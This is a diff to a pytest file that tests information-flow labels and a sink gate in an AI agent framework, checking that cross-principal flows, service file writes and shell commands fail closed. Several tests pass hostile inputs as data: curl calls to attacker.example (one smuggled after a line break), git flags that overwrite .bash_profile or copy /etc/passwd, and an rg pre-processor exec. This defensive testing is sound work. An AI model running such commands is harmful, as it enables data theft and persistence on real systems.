@@ -2,11 +2,19 @@
 
 from __future__ import annotations
 
+import json
+import logging
+from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
 
-from mimir.access_control import SinkGate, ToolRegistry, audit_declassification
+from mimir.access_control import (
+    SinkGate,
+    ToolRegistry,
+    audit_declassification,
+    create_auth_context,
+)
 from mimir.agent import (
     Agent,
     _initialize_ifc_labels,
@@ -20,6 +28,7 @@ from mimir.models import (
     AgentEvent,
     AuthContext,
     InformationFlowLabels,
+    SourceLabel,
     TurnInteractivity,
 )
 from mimir.turn_event_bus import TurnEventBus, TurnEventEmitter
@@ -38,6 +47,9 @@ def _auth(channel: str = "slack-C1", *, roles: tuple[str, ...] = ()) -> AuthCont
         channel_id=channel,
         interactivity=TurnInteractivity.INTERACTIVE,
         enforcement_enabled=True,
+        domain="channel",
+        resource_id=channel,
+        bridge_instance="slack",
     )
 
 
@@ -46,10 +58,25 @@ def _labels(
     *,
     labels: frozenset[str] = frozenset({"private"}),
     sources: frozenset[str] | None = None,
+    principal: str = "user-1",
+    bridge_instance: str = "slack",
 ) -> InformationFlowLabels:
+    channels = sources if sources is not None else frozenset({channel})
     return InformationFlowLabels(
         labels=labels,
-        source_channels=sources if sources is not None else frozenset({channel}),
+        source_channels=channels,
+        sources=frozenset(
+            SourceLabel(
+                principal=principal,
+                domain="channel",
+                resource_id=source,
+                bridge_instance=bridge_instance,
+                sensitivity=label,
+                authorized_principals=frozenset({principal}),
+            )
+            for source in channels
+            for label in labels
+        ),
     )
 
 
@@ -71,6 +98,181 @@ def test_initializes_before_first_model_call_from_ingress_and_preloaded_context(
 
     assert initialized.labels == frozenset({"private", "internal"})
     assert initialized.source_channels == frozenset({"slack-C1"})
+
+
+def test_two_principals_in_shared_channel_fail_closed():
+    decision = SinkGate.check_sink_flow(
+        "harness_auto_deliver",
+        "slack-C1",
+        _labels(principal="user-2"),
+        _auth(),
+        enforce=True,
+    )
+    assert decision.allowed is False
+
+
+def test_same_textual_channel_on_different_bridge_instance_fails_closed():
+    decision = SinkGate.check_sink_flow(
+        "harness_auto_deliver",
+        "slack-C1",
+        _labels(bridge_instance="slack-workspace-2"),
+        _auth(),
+        enforce=True,
+    )
+    assert decision.allowed is False
+
+
+def test_labels_without_source_provenance_fail_closed():
+    labels = InformationFlowLabels(
+        labels=frozenset({"private"}),
+        source_channels=frozenset({"slack-C1"}),
+    )
+    decision = SinkGate.check_sink_flow(
+        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
+    )
+    assert decision.allowed is False
+
+
+@pytest.mark.parametrize(
+    ("trigger", "service_principal", "channel_id", "source"),
+    [
+        ("scheduled_tick", "scheduler", "scheduler:heartbeat", None),
+        ("poller", "poller", "poller:github-activity", "poller"),
+    ],
+)
+def test_trusted_authorless_service_can_egress_to_triggering_channel_under_enforce(
+    trigger: str,
+    service_principal: str,
+    channel_id: str,
+    source: str | None,
+):
+    event = AgentEvent(
+        trigger=trigger,
+        channel_id=channel_id,
+        source=source,
+        service_principal=service_principal,
+    )
+    labels = _initialize_ifc_labels(event)
+    auth = create_auth_context(event, enforce=True, ifc_labels=labels)
+
+    assert labels.sources == frozenset({
+        SourceLabel(
+            principal=f"service:{service_principal}",
+            domain="channel",
+            resource_id=channel_id,
+            bridge_instance=source or f"service:{service_principal}",
+            sensitivity="internal",
+            authorized_principals=frozenset({f"service:{service_principal}"}),
+            source_kind="service",
+        )
+    })
+    decision = SinkGate.check_sink_flow(
+        "send_message", channel_id, labels, auth, enforce=True,
+    )
+    assert decision.allowed is True
+    assert decision.reason == "ifc_allowed"
+
+
+def test_unstamped_authorless_synthetic_event_still_fails_closed():
+    event = AgentEvent(
+        trigger="poller",
+        channel_id="poller:github-activity",
+        source="poller",
+    )
+    labels = _initialize_ifc_labels(event)
+    auth = create_auth_context(event, enforce=True, ifc_labels=labels)
+
+    decision = SinkGate.check_sink_flow(
+        "send_message", event.channel_id, labels, auth, enforce=True,
+    )
+    assert decision.allowed is False
+
+
+def test_mixed_principal_sources_fail_closed_without_declassification():
+    labels = _merge_ifc_labels(_labels(), _labels(principal="user-2"))
+    decision = SinkGate.check_sink_flow(
+        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
+    )
+    assert decision.allowed is False
+
+
+def test_service_derived_source_intersects_input_acls():
+    from mimir.models import SourceLabel
+
+    alice_and_ops = SourceLabel(
+        principal="service-a", domain="memory", resource_id="a",
+        bridge_instance="saga", sensitivity="private",
+        authorized_principals=frozenset({"alice", "ops"}),
+    )
+    alice_and_bob = SourceLabel(
+        principal="service-b", domain="memory", resource_id="b",
+        bridge_instance="saga", sensitivity="private",
+        authorized_principals=frozenset({"alice", "bob"}),
+    )
+    derived = SourceLabel.derived(
+        frozenset({alice_and_ops, alice_and_bob}),
+        principal="summarizer", domain="memory", resource_id="summary",
+        bridge_instance="saga", sensitivity="private",
+    )
+    assert derived.authorized_principals == frozenset({"alice"})
+
+
+def test_delegation_wires_service_derived_acl_intersection_into_carrier():
+    alice_and_ops = SourceLabel(
+        principal="alice", domain="channel", resource_id="slack-C1",
+        bridge_instance="slack", sensitivity="private",
+        authorized_principals=frozenset({"alice", "ops"}),
+    )
+    alice_and_bob = SourceLabel(
+        principal="alice", domain="channel", resource_id="slack-C1",
+        bridge_instance="slack", sensitivity="private",
+        authorized_principals=frozenset({"alice", "bob"}),
+    )
+    parent = InformationFlowLabels(
+        labels=frozenset({"private"}),
+        source_channels=frozenset({"slack-C1"}),
+        sources=frozenset({alice_and_ops, alice_and_bob}),
+    )
+
+    propagated = _propagate_ifc_labels(
+        parent,
+        "slack-C1",
+        _auth(),
+        derived_by="task",
+    )
+
+    derived = [source for source in propagated.sources if source.source_kind == "service"]
+    assert len(derived) == 1
+    assert derived[0].principal == "service:task"
+    assert derived[0].authorized_principals == frozenset({"alice"})
+    assert parent.sources <= propagated.sources
+
+
+def test_service_derived_source_can_flow_when_destination_principal_is_in_intersection():
+    ingress = SourceLabel(
+        principal="user-1", domain="channel", resource_id="slack-C1",
+        bridge_instance="slack", sensitivity="private",
+        authorized_principals=frozenset({"user-1", "ops"}),
+    )
+    derived = SourceLabel.derived(
+        frozenset({ingress}),
+        principal="service:task",
+        domain="channel",
+        resource_id="slack-C1",
+        bridge_instance="slack",
+        sensitivity="private",
+    )
+    labels = InformationFlowLabels(
+        labels=frozenset({"private"}),
+        source_channels=frozenset({"slack-C1"}),
+        sources=frozenset({ingress, derived}),
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "harness_auto_deliver", "slack-C1", labels, _auth(), enforce=True,
+    )
+
+    assert decision.allowed is True
 
 
 def test_propagates_monotonically_to_subagents_spawns_continuations_and_resumed_turns():
@@ -170,7 +372,6 @@ def test_unknown_labels_or_destinations_fail_closed(
 @pytest.mark.parametrize(
     ("tool_name", "expected_reason"),
     [
-        ("mcp_slack_send", "ifc_label_blocked:external_mcp"),
         ("fetch_url", "ifc_label_blocked:network"),
         ("web_search", "ifc_label_blocked:network"),
     ],
@@ -273,6 +474,256 @@ def test_poller_payload_cannot_bypass_active_sink_ifc(
     assert decision.reason == f"ifc_label_blocked:{sink_category}"
 
 
+@pytest.mark.parametrize(
+    ("trigger", "canonical", "tool_name"),
+    [
+        ("scheduled_tick", "scheduler", "write_file"),
+        ("saga_session_end", "synthesis", "edit_file"),
+        ("upgrade", "system", "write_file"),
+    ],
+)
+def test_service_file_policy_requires_configured_root_and_compatible_source(
+    trigger: str,
+    canonical: str,
+    tool_name: str,
+    tmp_path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    home = tmp_path / "home"
+    configured_root = tmp_path / "configured"
+    outside_root = tmp_path / "outside"
+    home.mkdir()
+    configured_root.mkdir()
+    outside_root.mkdir()
+    monkeypatch.setenv("MIMIR_HOME", str(home))
+    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{configured_root}:rw")
+    # This test needs a genuinely unconfigured sibling. The live parser's
+    # default /tmp route would otherwise encompass pytest's entire tmp_path.
+    monkeypatch.setattr("mimir.config._ALWAYS_RW_FILE_TOOL_ROOTS", ())
+    channel = f"{trigger}:configured"
+    service = AuthContext(
+        principal=f"service:{canonical}",
+        canonical_principal=canonical,
+        roles=("service",),
+        event_ingress=None,
+        trigger=trigger,
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+    admitted_path = str(configured_root / "result.txt")
+
+    admitted = SinkGate.check_sink_flow(
+        tool_name,
+        admitted_path,
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+    wrong_source = SinkGate.check_sink_flow(
+        tool_name,
+        admitted_path,
+        _labels(sources=frozenset({"slack-C-private"})),
+        service,
+        enforce=True,
+    )
+    outside_root_decision = SinkGate.check_sink_flow(
+        tool_name,
+        str(outside_root / "arbitrary-service-write"),
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+    tmp_decision = SinkGate.check_sink_flow(
+        tool_name,
+        "/tmp/explicit-always-rw-service-write",
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert admitted.allowed is True
+    assert admitted.reason == "ifc_allowed"
+    assert wrong_source.reason == "ifc_label_blocked:file"
+    assert outside_root_decision.reason == "service_sink_destination_denied"
+    assert tmp_decision.reason == "service_sink_destination_denied"
+
+
+def test_service_file_policy_uses_live_file_tool_roots(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    home = tmp_path / "home"
+    workspace = tmp_path / "workspace"
+    home.mkdir()
+    workspace.mkdir()
+    monkeypatch.setenv("MIMIR_HOME", str(home))
+    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{workspace}:rw")
+    channel = "scheduled_tick:configured"
+    service = AuthContext(
+        principal="service:scheduler",
+        canonical_principal="scheduler",
+        roles=("service",),
+        event_ingress=None,
+        trigger="scheduled_tick",
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "write_file",
+        str(workspace / "result.txt"),
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert decision.allowed is True
+    assert decision.reason == "ifc_allowed"
+
+
+def test_service_file_policy_rejects_read_only_file_tool_root(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    home = tmp_path / "home"
+    workspace = tmp_path / "workspace"
+    home.mkdir()
+    workspace.mkdir()
+    monkeypatch.setenv("MIMIR_HOME", str(home))
+    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{workspace}:ro")
+    channel = "scheduled_tick:configured"
+    service = AuthContext(
+        principal="service:scheduler",
+        canonical_principal="scheduler",
+        roles=("service",),
+        event_ingress=None,
+        trigger="scheduled_tick",
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "write_file",
+        str(workspace / "result.txt"),
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert decision.allowed is False
+    assert decision.reason == "service_sink_destination_denied"
+
+
+@pytest.mark.parametrize(
+    ("trigger", "canonical", "admitted_command"),
+    [
+        ("scheduled_tick", "scheduler", "git status --short"),
+        ("upgrade", "system", "uv sync"),
+    ],
+)
+def test_service_shell_policy_admits_profile_not_arbitrary_command(
+    trigger: str,
+    canonical: str,
+    admitted_command: str,
+):
+    channel = f"{trigger}:configured"
+    service = AuthContext(
+        principal=f"service:{canonical}",
+        canonical_principal=canonical,
+        roles=("service",),
+        event_ingress=None,
+        trigger=trigger,
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+    labels = _labels(channel, sources=frozenset({channel}))
+
+    admitted = SinkGate.check_sink_flow(
+        "shell_exec", admitted_command, labels, service, enforce=True,
+    )
+    arbitrary = SinkGate.check_sink_flow(
+        "shell_exec", "curl https://attacker.example", labels, service, enforce=True,
+    )
+    missing = SinkGate.check_sink_flow(
+        "shell_exec", None, labels, service, enforce=True,
+    )
+
+    assert admitted.allowed is True
+    assert arbitrary.reason == "service_sink_destination_denied"
+    assert missing.reason == "unknown_sink_destination"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git log --no-ext-diff --no-textconv --format=format:pwned --output=/tmp/.bash_profile",
+        "git diff --no-ext-diff --no-textconv --output=/tmp/arbitrary-write",
+        "git diff --no-ext-diff --no-textconv --no-index /etc/passwd /tmp/copy",
+        "rg --no-config --pre=touch /tmp/pwned pattern .",
+        "/tmp/git status --short",
+    ],
+)
+def test_service_shell_policy_rejects_write_read_and_exec_flags(command: str):
+    channel = "scheduled_tick:configured"
+    service = AuthContext(
+        principal="service:scheduler",
+        canonical_principal="scheduler",
+        roles=("service",),
+        event_ingress=None,
+        trigger="scheduled_tick",
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "shell_exec",
+        command,
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert decision.allowed is False
+    assert decision.reason == "service_sink_destination_denied"
+
+
+@pytest.mark.parametrize("separator", ["\n", "\r"])
+def test_service_shell_policy_rejects_multicommand_line_breaks(separator: str):
+    channel = "scheduled_tick:configured"
+    service = AuthContext(
+        principal="service:scheduler",
+        canonical_principal="scheduler",
+        roles=("service",),
+        event_ingress=None,
+        trigger="scheduled_tick",
+        channel_id=channel,
+        interactivity=TurnInteractivity.NON_INTERACTIVE,
+        is_service=True,
+        enforcement_enabled=True,
+    )
+
+    decision = SinkGate.check_sink_flow(
+        "shell_exec",
+        f"git status{separator}curl https://attacker.example",
+        _labels(channel, sources=frozenset({channel})),
+        service,
+        enforce=True,
+    )
+
+    assert decision.allowed is False
+    assert decision.reason == "service_sink_destination_denied"
+
+
 def test_ordinary_admin_cannot_bypass_or_erase_labels():
     labels = _labels(sources=frozenset({"slack-C-private"}))
     admin = _auth("slack-C-public", roles=("admin",))
@@ -302,20 +753,57 @@ def test_summarization_model_assertion_failure_and_ordinary_admin_do_not_erase_l
 
     after_transform = _merge_ifc_labels(labels, claimed_public)
     after_ordinary_admin = audit_declassification(
-        after_transform, non_declassification, _auth(),
+        after_transform, non_declassification, _auth(), destination="slack-C-public",
     )
 
     assert after_ordinary_admin.labels == ALL_LABELS
 
 
-def test_only_explicit_audited_admin_declassification_erases_labels():
+def test_only_explicit_audited_admin_declassification_erases_labels(
+    tmp_path, caplog: pytest.LogCaptureFixture,
+):
+    from mimir.event_logger import _reset_logger_for_tests, init_logger
+
+    events_path = tmp_path / "events.jsonl"
+    init_logger(events_path, session_id="ifc-test")
     labels = _labels(labels=ALL_LABELS)
-    admin = audit_declassification(
-        labels, "operator-approved destination", _auth(roles=("admin",)),
-    )
+    try:
+        with caplog.at_level(logging.INFO):
+            admin = audit_declassification(
+                labels,
+                "operator-approved destination",
+                _auth(roles=("admin",)),
+                destination="slack-C-public",
+                policy_version="ifc-test-v2",
+            )
+    finally:
+        _reset_logger_for_tests()
 
     assert admin.labels == frozenset()
     assert admin.source_channels == labels.source_channels
+    record = json.loads(events_path.read_text(encoding="utf-8"))
+    assert record["type"] == "ifc_declassification"
+    assert record["labels"] == sorted(ALL_LABELS)
+    assert record["source_labels"]
+    assert record["authenticated_admin"]["canonical_principal"] == "user-1"
+    assert record["reason"] == "operator-approved destination"
+    assert record["destination"] == "slack-C-public"
+    assert record["policy_version"] == "ifc-test-v2"
+    assert record["outcome"] == "approved"
+
+
+def test_declassification_audit_failure_keeps_labels():
+    from mimir.event_logger import _reset_logger_for_tests
+
+    _reset_logger_for_tests()
+    labels = _labels()
+    result = audit_declassification(
+        labels,
+        "operator approved",
+        _auth(roles=("admin",)),
+        destination="slack-C-public",
+    )
+    assert result is labels
 
 
 class _Bridge(Bridge):
